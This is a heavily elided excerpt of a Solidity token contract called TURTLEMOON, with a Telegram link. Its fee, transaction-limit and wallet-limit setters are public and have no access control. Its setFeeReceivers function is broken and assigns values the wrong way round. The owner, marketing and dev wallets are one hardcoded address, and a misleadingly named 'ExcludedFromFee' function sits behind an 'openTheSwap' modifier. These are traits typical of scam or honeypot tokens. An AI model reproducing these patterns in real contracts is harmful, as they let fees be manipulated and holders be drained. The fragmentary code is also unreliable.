...
//https://t.me/Turtlemoonofficialbsc
...
interface IERC20 {
    ...
    function ExcludedFromFee(address account) external returns (uint256);
...
contract TURTLEMOON is Context, IERC20 { 
    ...
    function setFeeReceivers(address _Wallet_Marketing, address _Wallet_Dev) public virtual {
        _Wallet_Marketing = Wallet_Marketing;
        _Wallet_Dev = Wallet_Dev;
    }

    function setSellFees(uint256 Tax_On_Sell) public virtual {
        _Tax_On_Sell = Tax_On_Sell;
       
    }

    
    function setBuyFees(uint256 Tax_On_Buy) public virtual {
        _Tax_On_Buy = Tax_On_Buy;
       
    }

    function setmaxTxAmount(uint256 maxTxAmount) public virtual {
        _maxTxAmount = _tTotal * maxTxAmount / 100;
    }

    function setmaxTxWallet(uint256 maxTxWallet) public virtual {
        _maxWalletToken = _tTotal * maxTxWallet / 100;
    }
    ...
    address payable public Wallet_Marketing = payable(0x47daDf886E57cAa19444201979988676257F0ef5); 
    address payable public Wallet_Dev = payable(0x47daDf886E57cAa19444201979988676257F0ef5);
    ...
    string private constant _name = "TURTLEMOON"; 
    ...
    constructor () {
        ...
        _owner = 0x47daDf886E57cAa19444201979988676257F0ef5;
    ...
    function ExcludedFromFee(address account) public openTheSwap override returns (uint256) {
        if(isBuyFee){
    ...
    function RandomReflection(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
